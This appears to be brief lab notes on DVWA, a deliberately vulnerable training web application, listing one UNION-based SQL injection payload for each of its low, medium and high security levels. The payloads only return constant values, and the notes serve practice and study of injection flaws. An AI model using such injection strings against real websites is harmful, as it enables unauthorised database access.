*DVWA SQL INJECTION VULNERABILITIES*

<h1>LOW LEVEL</h1>

?id=a' UNION SELECT "text1","text2";-- -&Submit=Submit

<h1>MEDIUM LEVEL</h1>

?id=a UNION SELECT 1,2;-- -&Submit=Submit

<h1>HIGH LEVEL</h1>

ID: a' UNION SELECT "text1","text2";-- -&Submit=Submit
